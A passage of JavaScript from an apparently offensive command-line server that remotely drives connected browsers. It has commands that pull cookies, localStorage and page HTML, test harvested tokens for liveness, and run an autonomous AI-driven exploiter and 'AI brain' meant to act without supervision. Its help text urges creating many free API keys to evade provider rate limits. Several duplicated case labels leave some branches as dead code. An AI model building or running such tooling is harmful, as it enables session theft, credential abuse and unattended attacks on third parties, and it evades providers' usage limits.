                        log('  3. Try a different provider: ai-provider gemini', 'dim');
                        log('  4. Get free Groq key: https://console.groq.com', 'dim');
                    }
                } catch (e) {
                    log(`❌ AI TEST ERROR: ${e.message}`, 'red');
                }
                break;

            // Reset AI availability (force resume from pause)
            case 'ai-reset':
            case 'aireset':
            case 'resetai':
                TerminalAI.aiAvailability.reset();
                TerminalAI.freeProviders.huggingface.consecutiveFailures = 0;
                TerminalAI.freeProviders.huggingface.rateLimitReset = 0;
                ProRateLimiter.adaptive.currentPenalty = { groq: 1, gemini: 1, openai: 1, deepseek: 1, together: 1, mistral: 1 };
                log('✅ AI reset! All cooldowns cleared.', 'green');
                break;

            // Show AI status
            case 'ai-status':
            case 'aistatus':
                const aiStatus = TerminalAI.aiAvailability.status();
                logBox('🤖 AI STATUS', [
                    `Provider: ${TerminalAI.config.provider?.toUpperCase() || 'NOT SET'}`,
                    `API Key: ${TerminalAI.config.apiKey ? '✅ Set' : '❌ Not set'}`,
                    `Available: ${aiStatus.available ? '✅ Yes' : '❌ No'}`,
                    `Paused: ${aiStatus.paused ? `⏸️ Yes (${aiStatus.pauseRemaining}s)` : '▶️ No'}`,
                    `Consecutive Failures: ${aiStatus.consecutiveFailures}`,
                    `Total Failures: ${aiStatus.totalFailures}`,
                    '',
                    'Commands:',
                    '  ai-reset    Force resume from pause',
                    '  ai-test     Test AI connection',
                    '  quiet       Enable quiet mode'
                ], aiStatus.available ? 'green' : 'yellow');
                break;

            // === GUARANTEED AI STATS ===
            case 'gai':
            case 'gai-stats':
            case 'guaranteed':
                const gaiStats = GuaranteedAI.getStats();
                logBox('🛡️ GUARANTEED AI SYSTEM', [
                    'Never fails - always returns response!',
                    '',
                    `⚡ Cache Hits: ${gaiStats.cacheHits}`,
                    `📡 API Calls: ${gaiStats.apiCalls}`,
                    `⏳ Rate Limits: ${gaiStats.rateLimits}`,
                    `✅ Successes: ${gaiStats.successes}`,
                    `📦 Cache Size: ${gaiStats.cacheSize}/${GuaranteedAI.cacheMaxSize}`,
                    `🎯 Last Provider: ${gaiStats.lastProvider || 'None'}`,
                    '',
                    '🔑 Browser Keys:',
                    ...Object.entries(gaiStats.browserKeys).map(([p, c]) => `   ${p.toUpperCase()}: ${c} keys`),
                    '',
                    '📥 Send keys from browser:',
                    '   window.ws.send(JSON.stringify({',
                    '     type: "browser_data",',
                    '     data: { type: "api_keys",',
                    '       keys: { groq: "gsk_...", gemini: "AIza..." }',
                    '     }',
                    '   }))'
                ], 'cyan');
                break;

            case 'gai-clear':
                GuaranteedAI.cache.clear();
                GuaranteedAI.stats.cacheHits = 0;
                GuaranteedAI.stats.apiCalls = 0;
                GuaranteedAI.stats.rateLimits = 0;
                GuaranteedAI.stats.successes = 0;
                log('✅ GuaranteedAI cache and stats cleared!', 'green');
                break;

            // === ULTRA RATE LIMIT BYPASS STATUS ===
            case 'bypass':
            case 'bypass-status':
            case 'ultra':
            case 'ultra-status':
                UltraRateLimitBypass.showStatus();
                break;

            case 'bypass-reset':
            case 'ultra-reset':
                UltraRateLimitBypass.cache.clear();
                Object.values(UltraRateLimitBypass.providerDistributor.providers).forEach(p => {
                    p.used = 0;
                    p.lastReset = Date.now();
                    p.cooldownUntil = 0;
                    p.healthy = true;
                });
                log('✅ UltraBypass reset! All providers cleared.', 'green');
                break;

            // === AI REQUEST QUEUE COMMANDS ===
            case 'queue':
            case 'queue-status':
            case 'qstatus':
                AIRequestQueue.showStatus();
                break;

            case 'queue-enable':
            case 'qenable':
                AIRequestQueue.enable();
                break;

            case 'queue-disable':
            case 'qdisable':
                AIRequestQueue.disable();
                break;

            case 'queue-clear':
            case 'qclear':
                AIRequestQueue.clear();
                break;

            // === BACKUP PROVIDER COMMANDS ===
            case 'setbackup':
            case 'backup':
                if (args.length >= 2) {
                    TerminalAI.setBackupKey(args[0], args.slice(1).join(' '));
                } else {
                    log('Usage: setbackup <provider> <key>', 'yellow');
                    log('Providers: groq, openai, deepseek, together, mistral, openrouter', 'cyan');
                }
                break;

            case 'setgroq':
                if (argStr) {
                    // Set as MAIN key AND backup
                    TerminalAI.init(argStr, 'groq');
                    TerminalAI.setBackupKey('groq', argStr);
                    log('✅ Groq set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: setgroq <api-key>', 'yellow');
                }
                break;

            case 'setopenai':
                if (argStr) {
                    TerminalAI.init(argStr, 'openai');
                    TerminalAI.setBackupKey('openai', argStr);
                    log('✅ OpenAI set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: setopenai <api-key>', 'yellow');
                }
                break;

            case 'setdeepseek':
                if (argStr) {
                    TerminalAI.init(argStr, 'deepseek');
                    TerminalAI.setBackupKey('deepseek', argStr);
                    log('✅ DeepSeek set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: setdeepseek <api-key>', 'yellow');
                }
                break;

            case 'settogether':
                if (argStr) {
                    TerminalAI.init(argStr, 'together');
                    TerminalAI.setBackupKey('together', argStr);
                    log('✅ Together set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: settogether <api-key>', 'yellow');
                }
                break;

            case 'setmistral':
                if (argStr) {
                    TerminalAI.init(argStr, 'mistral');
                    TerminalAI.setBackupKey('mistral', argStr);
                    log('✅ Mistral set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: setmistral <api-key>', 'yellow');
                }
                break;

            case 'setgemini':
                if (argStr) {
                    TerminalAI.init(argStr, 'gemini');
                    TerminalAI.setBackupKey('gemini', argStr);
                    log('✅ Gemini set as PRIMARY provider!', 'green');
                } else {
                    log('Usage: setgemini <api-key>', 'yellow');
                }
                break;

            case 'backups':
            case 'showbackups':
                TerminalAI.showBackups();
                break;

            case 'sethf':
            case 'sethuggingface':
                if (argStr) {
                    TerminalAI.setBackupKey('huggingface', argStr);
                    log('✅ HuggingFace token set - better rate limits!', 'green');
                } else {
                    log('Usage: sethf <token>', 'yellow');
                    log('Get free token: https://huggingface.co/settings/tokens', 'cyan');
                }
                break;

            case 'resethf':
            case 'resethuggingface':
                TerminalAI.freeProviders.huggingface.failures = 0;
                TerminalAI.freeProviders.huggingface.rateLimitReset = 0;
                log('✅ HuggingFace reset - can be used again', 'green');
                break;

            case 'apihelp':
            case 'keys':
            case 'api-help':
                logBox('🔑 API KEYS SETUP GUIDE', [
                    '',
                    `${C.green}${C.bold}FREE API KEYS (No Credit Card):${C.reset}`,
                    '',
                    '  1. GROQ (Recommended - Fast & Free):',
                    '     Website: https://console.groq.com',
                    '     Command: setgroq gsk_xxxxxxxxxxxxxxxxxx',
                    '',
                    '  2. HuggingFace (Free - No Key Needed):',
                    '     Works without key but rate limited',
                    '     For better limits: https://huggingface.co/settings/tokens',
                    '     Command: sethf hf_xxxxxxxxxxxxxxxxxx',
                    '     Reset if disabled: resethf',
                    '',
                    '  3. Together AI (Free Tier):',
                    '     Website: https://api.together.xyz',
                    '     Command: settogether xxxxxxxxxxxx',
                    '',
                    '  4. DeepSeek (Very Cheap):',
                    '     Website: https://platform.deepseek.com',
                    '     Command: setdeepseek sk-xxxxxxxxxx',
                    '',
                    `${C.yellow}${C.bold}PAID API KEYS:${C.reset}`,
                    '',
                    '  5. OpenAI (Best Quality):',
                    '     Website: https://platform.openai.com',
                    '     Command: setopenai sk-xxxxxxxxxx',
                    '',
                    '  6. Mistral:',
                    '     Website: https://console.mistral.ai',
                    '     Command: setmistral xxxxxxxxxxxx',
                    '',
                    `${C.cyan}${C.bold}PRIMARY KEY (Main Provider):${C.reset}`,
                    '  ai-key YOUR_KEY    Auto-detects provider from key format',
                    '',
                    `${C.red}${C.bold}🔑 BULK KEY POOL (NEVER GET RATE LIMITED!):${C.reset}`,
                    '',
                    '  Create 5-10 FREE Groq keys and add them all:',
                    '',
                    '  Method 1 - One by one:',
                    '    addkey groq gsk_key1',
                    '    addkey groq gsk_key2',
                    '    addkey groq gsk_key3',
                    '',
                    '  Method 2 - Multiple at once:',
                    '    addkeys groq gsk_key1 gsk_key2 gsk_key3',
                    '',
                    '  Method 3 - Paste many keys:',
                    '    bulkkeys groq',
                    '    (paste keys one per line, type "done" when finished)',
                    '',
                    '  View key pool: keypool',
                    '  Save keys:     savekeys',
                    '  Load keys:     loadkeys',
                    '',
                    `${C.green}${C.bold}HOW IT WORKS:${C.reset}`,
                    '  When key #1 hits rate limit → auto-switches to key #2',
                    '  When key #2 hits rate limit → auto-switches to key #3',
                    '  After cooldown → keys become active again',
                    '  With 5+ keys: ZERO rate limiting!',
                    '',
                    `${C.magenta}${C.bold}QUICK START:${C.reset}`,
                    '  1. Go to console.groq.com',
                    '  2. Sign up (free, no credit card)',
                    '  3. Create 5+ API keys',
                    '  4. Run: bulkkeys groq',
                    '  5. Paste all keys, type "done"',
                    '',
                    'Type "keypool" to see all your keys',
                    ''
                ], 'cyan');
                break;

            // ═══════════════════════════════════════════════════════════
            // 🔑 BULK API KEY POOL COMMANDS
            // ═══════════════════════════════════════════════════════════

            case 'addkey':
                if (args.length >= 2) {
                    const provider = args[0].toLowerCase();
                    const key = args.slice(1).join('');
                    TerminalAI.addKeyToPool(provider, key);
                } else {
                    log('Usage: addkey <provider> <key>', 'yellow');
                    log('Example: addkey groq gsk_xxxxxxxxxx', 'cyan');
                    log('Providers: groq, gemini, openai, deepseek, together, mistral, huggingface', 'cyan');
                }
                break;

            case 'addkeys':
                if (args.length >= 2) {
                    const provider = args[0].toLowerCase();
                    const keys = args.slice(1);
                    TerminalAI.addKeysToPool(provider, keys);
                } else {
                    log('Usage: addkeys <provider> <key1> <key2> <key3> ...', 'yellow');
                    log('Example: addkeys groq gsk_key1 gsk_key2 gsk_key3', 'cyan');
                }
                break;

            case 'bulkkeys':
                if (args.length >= 1) {
                    const provider = args[0].toLowerCase();
                    log(`📋 Paste your ${provider.toUpperCase()} API keys (one per line)`, 'cyan');
                    log('   When done, type "done" and press Enter', 'yellow');
                    log('', 'white');

                    // Set bulk input mode
                    TerminalCLI.bulkInputMode = {
                        active: true,
                        provider: provider,
                        keys: []
                    };
                } else {
                    log('Usage: bulkkeys <provider>', 'yellow');
                    log('Example: bulkkeys groq', 'cyan');
                    log('Then paste keys one per line, type "done" when finished', 'cyan');
                }
                break;

            case 'keypool':
            case 'showkeys':
            case 'keys-status':
            case 'pool':
                TerminalAI.showKeyPool();
                break;

            case 'removekey':
                if (args.length >= 2) {
                    const provider = args[0].toLowerCase();
                    const index = parseInt(args[1]) - 1; // User inputs 1-based
                    TerminalAI.removeKeyFromPool(provider, index);
                } else {
                    log('Usage: removekey <provider> <number>', 'yellow');
                    log('Example: removekey groq 2 (removes 2nd groq key)', 'cyan');
                }
                break;

            case 'clearkeys':
                if (args.length >= 1) {
                    const provider = args[0].toLowerCase();
                    if (TerminalAI.keyPool[provider]) {
                        TerminalAI.keyPool[provider] = [];
                        log(`🧹 Cleared all ${provider.toUpperCase()} keys`, 'green');
                    }
                } else {
                    log('Usage: clearkeys <provider>', 'yellow');
                }
                break;

            case 'cleardeadkeys':
            case 'cleandead':
                const removed = TerminalAI.clearDeadKeys(args[0] || null);
                break;

            case 'ratelimit':
            case 'rl':
            case 'limiter':
            case 'ratestatus':
                ProRateLimiter.showStatus();
                break;

            case 'resetlimiter':
            case 'resetrl':
                // Reset all penalties
                Object.keys(ProRateLimiter.buckets).forEach(provider => {
                    ProRateLimiter.adaptive.currentPenalty[provider] = 1;
                    ProRateLimiter.adaptive.successStreak[provider] = 0;
                    ProRateLimiter.refillBucket(provider);
                });
                log('🔄 Rate limiter penalties reset', 'green');
                break;

            // === BACKGROUND TASK COMMANDS ===
            case 'bg':
            case 'bgtasks':
            case 'background':
                BackgroundTaskManager.showStatus();
                break;

            case 'bglogs':
            case 'bglog':
                const logLines = parseInt(args[0]) || 30;
                BackgroundTaskManager.viewLogs(logLines);
                break;

            case 'bgsilent':
                BackgroundTaskManager.toggleSilent();
                break;

            case 'bgclear':
                const cleared = BackgroundTaskManager.clearCompleted();
                log(`🧹 Cleared ${cleared} completed tasks`, 'cyan');
                break;

            // === OUTPUT MANAGER COMMANDS ===
            case 'cleanmode':
            case 'clean':
                OutputManager.toggleCleanMode();
                break;

            case 'spinner':
                if (args[0] === 'stop') {
                    OutputManager.stopSpinner('Stopped', 'yellow');
                } else {
                    OutputManager.startSpinner(argStr || 'Processing...', 'cyan');
                    setTimeout(() => OutputManager.stopSpinner('Demo complete!'), 3000);
                }
                break;

            case 'demo':
                // Demo the CLI animations
                await this.runAnimationDemo();
                break;

            // === BACKGROUND LOG COMMANDS ===
            case 'quiet':
            case 'quietmode':
            case 'silent':
                CONFIG.QUIET_MODE = !CONFIG.QUIET_MODE;
                if (CONFIG.QUIET_MODE) {
                    logBox('🔕 QUIET MODE ENABLED', [
                        'Background activity will go to separate log file.',
                        'Your terminal stays clean for typing!',
                        '',
                        'Commands:',
                        '  logs     - Open log viewer in browser',
                        '  bglogs   - Show recent background logs',
                        '  loud     - Disable quiet mode'
                    ], 'green');
                    BackgroundLogger.openViewer();
                } else {
                    log('🔔 Quiet mode DISABLED - all logs shown in terminal', 'yellow');
                }
                break;

            case 'loud':
            case 'verbose':
                CONFIG.QUIET_MODE = false;
                log('🔔 Verbose mode - all logs shown in terminal', 'yellow');
                break;

            case 'logs':
            case 'viewlogs':
            case 'logviewer':
                BackgroundLogger.openViewer();
                break;

            case 'bglogs':
            case 'background':
            case 'bgstatus':
                const recentLogs = BackgroundLogger.getRecent(15);
                if (recentLogs.length === 0) {
                    log('📭 No background logs yet', 'dim');
                } else {
                    log(`\n📋 Recent Background Activity (${recentLogs.length} logs):`, 'cyan');
                    recentLogs.forEach(l => {
                        const colorCode = C[l.color] || C.white;
                        console.log(`${C.dim}[${l.time}]${C.reset} ${colorCode}${l.msg}${C.reset}`);
                    });
                    log(`\n💡 Use 'logs' to open full viewer in browser`, 'dim');
                }
                break;

            case 'clearlogs':
            case 'clearbackground':
                BackgroundLogger.clear();
                log('🧹 Background logs cleared', 'green');
                break;

            // === ANALYZE SPECIFIC FINDING FROM MASTER EXPLOIT ===
            case 'analyze':
            case 'analysefinding':
                const findings = DataStore.data.masterExploitResults || [];
                if (findings.length === 0) {
                    log('❌ No findings available. Run autoexploit in browser first.', 'yellow');
                    break;
                }

                if (!args[0]) {
                    // Show list of findings
                    log(`📋 ${findings.length} findings available:`, 'cyan');
                    findings.slice(0, 20).forEach((f, i) => {
                        const keyPreview = f.key?.substring(0, 30) || '?';
                        const status = f.isVulnerable ? `${C.green}✅ VULN${C.reset}` : `${C.dim}○${C.reset}`;
                        console.log(`${C.cyan}  [${i + 1}]${C.reset} ${status} ${f.type}: ${keyPreview}...`);
                    });
                    if (findings.length > 20) {
                        log(`   ... and ${findings.length - 20} more`, 'dim');
                    }
                    log(`\nUse: analyze <number> to analyze specific finding`, 'yellow');
                } else {
                    const idx = parseInt(args[0]) - 1;
                    if (idx < 0 || idx >= findings.length) {
                        log(`❌ Invalid index. Use 1-${findings.length}`, 'red');
                        break;
                    }

                    const finding = findings[idx];
                    log(`🔍 Analyzing finding #${idx + 1}: ${finding.type}`, 'magenta');
                    console.log(`${C.dim}Key: ${finding.key?.substring(0, 50)}...${C.reset}`);
                    console.log(`${C.dim}Source: ${finding.source}${C.reset}`);

                    if (finding.aiPrompt && TerminalAI.config.apiKey) {
                        log('🤖 Querying AI...', 'magenta');
                        await ProRateLimiter.smartWait(TerminalAI.config.provider || 'groq');
                        const response = await TerminalAI.query(finding.aiPrompt);
                        console.log(`\n${C.magenta}${C.bold}AI Analysis:${C.reset}`);
                        console.log(response);
                        console.log();
                    } else {
                        log('⚠️ AI not configured. Set key with: ai-key <your_key>', 'yellow');
                    }
                }
                break;

            case 'findings':
            case 'showfindings':
                const allFindings = DataStore.data.masterExploitResults || DataStore.data.findings || [];
                if (allFindings.length === 0) {
                    log('❌ No findings stored. Run autoexploit in browser.', 'yellow');
                } else {
                    log(`📋 Stored Findings (${allFindings.length}):`, 'cyan');
                    allFindings.slice(0, 30).forEach((f, i) => {
                        const keyPreview = f.key?.substring(0, 25) || f.value?.substring(0, 25) || '?';
                        const sev = f.severity || 'MEDIUM';
                        const sevColor = sev === 'CRITICAL' ? C.red : sev === 'HIGH' ? C.yellow : C.dim;
                        console.log(`${C.cyan}  [${i + 1}]${C.reset} ${sevColor}${sev}${C.reset} ${f.type}: ${keyPreview}...`);
                    });
                }
                break;

            case 'savekeys':
            case 'savepool':
                TerminalAI.saveKeyPool();
                break;

            case 'loadkeys':
            case 'loadpool':
                TerminalAI.loadKeyPool();
                break;

            case 'rotatekey':
                if (args.length >= 1) {
                    const provider = args[0].toLowerCase();
                    const nextKey = TerminalAI.markKeyRateLimited(provider, 0); // Force rotate
                    if (nextKey) {
                        log(`🔄 Rotated to next ${provider.toUpperCase()} key`, 'green');
                    }
                } else {
                    log('Usage: rotatekey <provider>', 'yellow');
                }
                break;

            // Show findings
            case 'findings':
                this.showFindings();
                break;

            // Show exploit results
            case 'results':
                this.showResults();
                break;

            // ═══════════════════════════════════════════════════════════
            // 🔥 AUTONOMOUS EXPLOITER COMMANDS
            // ═══════════════════════════════════════════════════════════

            case 'autoexploit':
            case 'pwn':
                if (DataStore.data.findings.length > 0) {
                    log('🔥 Starting Autonomous Exploiter with stored findings...', 'red');
                    AutonomousExploiter.init(null);
                    AutonomousExploiter.run(DataStore.data.findings, DataStore.data.browserData);
                } else {
                    log('⚠️ No findings available. Run scan first: scan', 'yellow');
                }
                break;

            case 'exploit-stop':
            case 'stop-exploit':
            case 'pwn-stop':
                AutonomousExploiter.stop();
                break;

            case 'exploit-status':
            case 'pwn-status':
                const status = AutonomousExploiter.status();
                logBox('🔥 EXPLOITER STATUS', [
                    `Running: ${status.running ? 'YES' : 'NO'}`,
                    `Iteration: ${status.iteration}/${AutonomousExploiter.maxIterations}`,
                    `Queue: ${status.queueLength} commands`,
                    `Executed: ${status.commandsExecuted}`,
                    `Vulns Found: ${status.vulnerabilitiesFound}`,
                    `Scripts: ${status.scriptsGenerated}`
                ], 'red');
                break;

            case 'vulns':
            case 'vulnerabilities':
                if (AutonomousExploiter.vulnerabilitiesFound.length > 0) {
                    log('\n🔴 DISCOVERED VULNERABILITIES:', 'red');
                    AutonomousExploiter.vulnerabilitiesFound.forEach((v, i) => {
                        log(`\n[${i + 1}] ${v.analysis?.vulnerabilityType || 'Unknown'}`, 'yellow');
                        log(`    Confidence: ${v.analysis?.confidenceLevel || 'N/A'}`, 'white');
                        log(`    Command: ${v.command.substring(0, 60)}...`, 'cyan');
                        if (v.analysis?.proofOfConcept) {
                            log(`    PoC: ${v.analysis.proofOfConcept.substring(0, 100)}...`, 'green');
                        }
                    });
                } else {
                    log('No vulnerabilities found yet. Run: autoexploit', 'yellow');
                }
                break;

            case 'scripts':
                if (AutonomousExploiter.scriptsGenerated.length > 0) {
                    log('\n📜 GENERATED SCRIPTS:', 'magenta');
                    AutonomousExploiter.scriptsGenerated.forEach(s => {
                        log(`  ${s.type}: ${s.path}`, 'green');
                    });
                } else {
                    log('No scripts generated yet', 'yellow');
                }
                break;

            // ═══════════════════════════════════════════════════════════
            // 🔑 TOKEN TESTER COMMANDS
            // ═══════════════════════════════════════════════════════════

            case 'testkeys':
            case 'testtokens':
            case 'test-all':
                if (DataStore.data.findings.length > 0) {
                    log('🔑 Starting Token Tester...', 'cyan');
                    TokenTester.testAll(DataStore.data.findings);
                } else {
                    log('⚠️ No findings available. Run scan first: scan', 'yellow');
                }
                break;

            case 'test-status':
                const tStatus = TokenTester.status();
                logBox('🔑 TOKEN TESTER STATUS', [
                    `Running: ${tStatus.running ? 'YES' : 'NO'}`,
                    `Total Tested: ${tStatus.stats.total}`,
                    `Live: ${tStatus.stats.live}`,
                    `Dead: ${tStatus.stats.dead}`,
                    `Errors: ${tStatus.stats.errors}`
                ], 'cyan');
                break;

            case 'livekeys':
            case 'livetokens':
                if (TokenTester.liveTokens.length > 0) {
                    log('\n✅ LIVE TOKENS:', 'green');
                    TokenTester.liveTokens.forEach((t, i) => {
                        log(`\n[${i + 1}] ${t.type.toUpperCase()}`, 'yellow');
                        log(`    Token: ${t.value.substring(0, 40)}...`, 'cyan');
                        log(`    Result: ${JSON.stringify(t.result).substring(0, 80)}`, 'white');
                        log(`    Source: ${t.finding.source || 'unknown'}`, 'dim');
                    });
                } else {
                    log('No live tokens found yet. Run: testkeys', 'yellow');
                }
                break;

            // ═══════════════════════════════════════════════════════════
            // 🧠 AI BRAIN - AUTONOMOUS THINKING ENGINE
            // ═══════════════════════════════════════════════════════════
            case 'brain':
            case 'think':
            case 'autonomous':
                if (!TerminalAI.config.isActive) {
                    log('⚠️ AI not configured. Use: ai-key YOUR_KEY', 'yellow');
                    break;
                }
                if (DataStore.data.findings.length === 0) {
                    log('⚠️ No findings. Run scan first: scan', 'yellow');
                    break;
                }

                log('🧠 STARTING AI BRAIN - AUTONOMOUS MODE', 'magenta');
                log('   AI will think, decide, and act on its own...', 'cyan');

                // Get first connected browser's WebSocket
                const firstBrowser = connectedBrowsers.values().next().value;
                const brainWs = firstBrowser?.ws || null;

                AIBrain.init(brainWs, DataStore.data.findings, DataStore.data.browserData?.domain);
                AIBrain.startThinking().then(report => {
                    if (report) {
                        logBox('🧠 AI BRAIN COMPLETED', [
                            `Total cycles: ${report.totalCycles || 0}`,
                            `Commands executed: ${report.commandsExecuted || 0}`,
                            `Discoveries: ${report.discoveries?.length || 0}`,
                            `Goals achieved: ${report.goalsAchieved || 0}/${report.totalGoals || 0}`
                        ], 'green');
                    } else {
                        log('⚠️ AI Brain finished (no report generated)', 'yellow');
                    }
                }).catch(err => {
                    log(`❌ AI Brain error: ${err.message}`, 'red');
                });
                break;

            case 'brain-stop':
            case 'think-stop':
                AIBrain.stop();
                log('🛑 AI Brain stopped', 'yellow');
                break;

            case 'brain-status':
            case 'think-status':
                logBox('🧠 AI BRAIN STATUS', [
                    `Running: ${AIBrain.isRunning ? 'YES' : 'NO'}`,
                    `Current Cycle: ${AIBrain.currentCycle}`,
                    `Short-term Memory: ${AIBrain.memory.shortTerm.length} items`,
                    `Long-term Memory: ${AIBrain.memory.longTerm.length} items`,
                    `Discoveries: ${AIBrain.memory.discoveries.length}`,
                    `Active Goals: ${AIBrain.memory.goals.filter(g => !g.achieved).length}`,
                    `Knowledge: ${Object.keys(AIBrain.memory.knowledge).length} keys`
                ], 'cyan');
                break;

            case 'discoveries':
            case 'brain-discoveries':
                if (AIBrain.memory.discoveries.length > 0) {
                    log('\n🎯 AI DISCOVERIES:', 'green');
                    AIBrain.memory.discoveries.forEach((d, i) => {
                        const sevColor = d.severity === 'critical' ? 'red' : d.severity === 'high' ? 'yellow' : 'cyan';
                        log(`\n[${i + 1}] ${d.severity?.toUpperCase() || 'INFO'}`, sevColor);
                        log(`    ${d.discovery}`, 'white');
                        log(`    Context: ${(d.context || '').substring(0, 60)}`, 'dim');
                    });
                } else {
                    log('No discoveries yet. Run: brain', 'yellow');
                }
                break;

            // ═══════════════════════════════════════════════════════════
            // 🚀 FULL AUTOMATION - ONE CLICK EVERYTHING
            // ═══════════════════════════════════════════════════════════
            case 'fullpwn':
            case 'fullautomation':
            case 'autopwn-all':
            case 'nuke':
                if (!TerminalAI.config.isActive) {
                    log('⚠️ AI not configured. Use: ai-key YOUR_KEY', 'yellow');
                    break;
                }

                log('🚀 STARTING FULL AUTOMATION', 'red');
                log('   Phase 1: Token Testing (all tokens)', 'cyan');
                log('   Phase 2: AI Brain (autonomous thinking)', 'cyan');
                log('   Phase 3: Autonomous Exploitation', 'cyan');
                log('   Phase 4: Master Report Generation', 'cyan');
                log('', 'white');
                log('   ⚠️ This will run EVERYTHING automatically!', 'yellow');

                const fullWs = connectedBrowsers.values().next().value?.ws || null;

                FullAutomation.start(fullWs, DataStore.data.findings, DataStore.data.browserData)
                    .then(report => {
                        logBox('🏆 FULL AUTOMATION COMPLETE', [
                            `Duration: ${Math.round(report.duration / 1000)}s`,
                            `Total Findings: ${report.summary?.totalFindings || 0}`,
                            `Live Tokens: ${report.summary?.liveTokens || 0}`,
                            `Vulnerabilities: ${report.summary?.vulnerabilities || 0}`,
                            `AI Discoveries: ${report.summary?.aiDiscoveries || 0}`
                        ], 'green');
                    });
                break;

            case 'fullstop':
            case 'stopall':
                FullAutomation.stop();
                log('🛑 Full automation stopped', 'yellow');
                break;

            // Clear
            case 'clear':
            case 'cls':
                console.clear();
                break;

            // Export
            case 'export':
                this.exportData(argStr || 'nexus-export.json');
                break;

            // Exploit specific finding
            case 'exploit':
                if (argStr) {
                    await this.exploitFinding(parseInt(argStr));
                }
                break;

            // Auto-exploit all
            case 'auto':
            case 'autopwn':
                await this.autoExploit();
                break;

            // Show browsers
            case 'browsers':
                this.showBrowsers();
                break;

            // ═══════════════════════════════════════════════════════════
            // ADVANCED BROWSER CONTROL COMMANDS
            // ═══════════════════════════════════════════════════════════

            // Get all data from browsers
            case 'getdata':
            case 'extract':
                sendToBrowser('get_all_data');
                log('📥 Requesting all data from browsers...', 'blue');
                break;

            // Get findings from browsers
            case 'getfindings':
                sendToBrowser('get_findings');
                log('📥 Requesting findings from browsers...', 'blue');
                break;

            // Get cookies from browsers
            case 'cookies':
                sendToBrowser('get_cookies');
                log('📥 Requesting cookies from browsers...', 'blue');
                break;

            // Get storage from browsers
            case 'storage':
                sendToBrowser('get_storage');
                log('📥 Requesting localStorage/sessionStorage...', 'blue');
                break;

            // Navigate browser
            case 'goto':
            case 'navigate':
                if (argStr) {
                    sendToBrowser('navigate', { url: argStr });
                    log(`🌐 Navigating browsers to: ${argStr}`, 'blue');
                }
                break;

            // Click element
            case 'click':
                if (argStr) {
                    sendToBrowser('click', { selector: argStr });
                    log(`👆 Clicking: ${argStr}`, 'blue');
                }
                break;

            // Type in element
            case 'type':
                const [selector, ...textParts] = argStr.split(' ');
                const text = textParts.join(' ');
                if (selector && text) {
                    sendToBrowser('type', { selector, text });
                    log(`⌨️ Typing in ${selector}`, 'blue');
                }
                break;

            // Get HTML
            case 'html':
                sendToBrowser('get_html', { selector: argStr || 'body' });
                log('📄 Requesting HTML...', 'blue');
                break;

            // Fetch URL from browser
            case 'fetch':
                if (argStr) {
                    sendToBrowser('fetch', { url: argStr });
                    log(`🌐 Fetching: ${argStr}`, 'blue');
                }
                break;

            // AI query through browser
            case 'browser-ai':
            case 'bai':
                if (argStr) {
                    sendToBrowser('ai_query', { prompt: argStr });
                    log('🤖 Sending AI query to browser...', 'magenta');
                }
                break;

            // Ping all browsers
            case 'ping':
                sendToBrowser('status');
                log('📡 Pinging all browsers...', 'blue');
                break;

            // Sync all browsers
            case 'sync':
                sendToBrowser('sync');
                sendToBrowser('get_findings');
                log('🔄 Full sync initiated with all browsers...', 'blue');
                break;

            // === AI COLLABORATION COMMANDS ===
            case 'collab':
            case 'collaborate':
                if (!TerminalAI.config.isActive) {
                    log('❌ AI not configured. Use: ai-key YOUR_KEY', 'red');
                    break;
                }
                if (connectedBrowsers.size === 0) {
                    log('❌ No browsers connected.', 'red');
                    break;
                }
                log('🤝 Initiating AI collaboration...', 'magenta');
                // Request findings from browser for collaboration
                sendToBrowser('get_findings');
                sendToBrowser('get_all_data');
                log('📥 Requested browser data for AI collaboration', 'blue');
                log('   AI will auto-analyze when data arrives', 'dim');
                break;

            case 'collab-log':
            case 'collablog':
                if (TerminalAI.collaborationLog.length === 0) {
                    log('No collaboration history yet.', 'yellow');
                } else {
                    logBox('🤝 AI COLLABORATION LOG',
                        TerminalAI.collaborationLog.slice(-10).map(c =>
                            `${c.timestamp.split('T')[1]?.split('.')[0] || ''} | ${c.direction} | ${c.findingsReceived || 0} findings`
                        )
                        , 'magenta');
                }
                break;

            case 'collab-mode':
                CONFIG.AI_COLLAB_MODE = !CONFIG.AI_COLLAB_MODE;
                TerminalAI.config.collaborationMode = CONFIG.AI_COLLAB_MODE;
                log(`AI Collaboration mode: ${CONFIG.AI_COLLAB_MODE ? 'ENABLED' : 'DISABLED'}`, CONFIG.AI_COLLAB_MODE ? 'green' : 'yellow');
                break;

            case 'auto-sync':
            case 'autosync':
                CONFIG.AUTO_SYNC = !CONFIG.AUTO_SYNC;
                log(`Auto-sync: ${CONFIG.AUTO_SYNC ? 'ENABLED' : 'DISABLED'}`, CONFIG.AUTO_SYNC ? 'green' : 'yellow');
                break;

            case 'deep':
            case 'deep-analysis':
            case 'analyze':
                if (!TerminalAI.config.isActive) {
                    log('❌ AI not configured. Use: ai-key YOUR_KEY', 'red');
                    break;
                }

                // Try to get findings from stored report or DataStore
                let deepFindings = [];
                const storedReport = DataStore.getCustom('lastAIAgentReport');

                if (storedReport?.findings?.length > 0) {
                    deepFindings = storedReport.findings;
                    log(`📋 Using ${deepFindings.length} findings from last AI Agent report`, 'cyan');
                } else if (storedReport?.rawData?.findings?.length > 0) {
                    deepFindings = storedReport.rawData.findings;
                    log(`📋 Using ${deepFindings.length} findings from rawData`, 'cyan');
                } else if (DataStore.data.findings.length > 0) {
                    deepFindings = DataStore.data.findings;
                    log(`📋 Using ${deepFindings.length} findings from DataStore`, 'cyan');
                } else {
                    log('No findings to analyze. Run sync or aiAgent() in browser first.', 'yellow');
                    break;
                }

                log('🔬 DEEP ANALYSIS WITH COMMAND EXECUTION...', 'magenta');

                // Deep analysis for each finding with curl execution
                for (let i = 0; i < Math.min(deepFindings.length, 15); i++) {
                    const f = deepFindings[i];
                    const fullValue = f.fullValue || f.value;

                    log(`\n[${i + 1}/${Math.min(deepFindings.length, 15)}] Analyzing: ${f.type}...`, 'cyan');

                    const deepPrompt = `You are an expert bug bounty hunter. Analyze this finding and provide validation:

FINDING:
- Type: ${f.type}
- Full Value: ${fullValue}
- Source: ${f.source?.location || f.source || 'unknown'}
- Service: ${f.aiAnalysis?.service || f.service || 'unknown'}

